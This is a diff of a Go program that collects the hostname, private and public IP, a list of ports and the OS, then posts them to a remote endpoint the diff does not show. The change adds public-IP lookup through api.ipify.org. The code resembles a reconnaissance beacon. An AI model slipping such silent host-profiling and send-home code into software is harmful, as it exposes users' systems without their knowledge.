@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"encoding/json"
 	"fmt"
+	"io/ioutil"
 	"net"
 	"net/http"
 	"os"
@@ -14,6 +15,7 @@ import (
 type network struct {
 	Hostname string
 	LocalIP  string
+	PublicIP string
 	Nmap     []int
 	OS       string
 }
@@ -26,15 +28,20 @@ func main() {
 	if err != nil {
 		h = "n/a"
 	}
-	i, err := getIP()
+	i, err := getPrivateIP()
 	if err != nil {
 		i = "n/a"
+	}
+	pip, err := getPublicIP()
+	if err != nil {
+		pip = "n/a"
 	}
 	p := getPorts()
 	o := runtime.GOOS
 	networks := &network{
 		Hostname: h,
 		LocalIP:  i,
+		PublicIP: pip,
 		Nmap:     p,
 		OS:       o,
 	}
@@ -45,7 +52,8 @@ func main() {
 	http.DefaultClient.Do(req)
 }
 
-func getIP() (string, error) {
+func getPrivateIP() (string, error) {
+	// (?) if behind NAT returns private IP
 	conn, err := net.Dial("udp", "8.8.8.8:80")
 	if err != nil {
 		return "", err
@@ -53,6 +61,21 @@ func getIP() (string, error) {
 	defer conn.Close()
 	localAddr := conn.LocalAddr().(*net.UDPAddr)
 	return localAddr.IP.String(), nil
+}
+
+func getPublicIP() (string, error) {
+	url := "https://api.ipify.org?format=text"
+	resp, err := http.Get(url)
+	if err != nil {
+		return "", err
+	}
+	defer resp.Body.Close()
+	ip, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return "", err
+	}
+	pubip := fmt.Sprintf("%s", ip)
+	return pubip, nil
 }
 
 func getHostname() (string, error) {
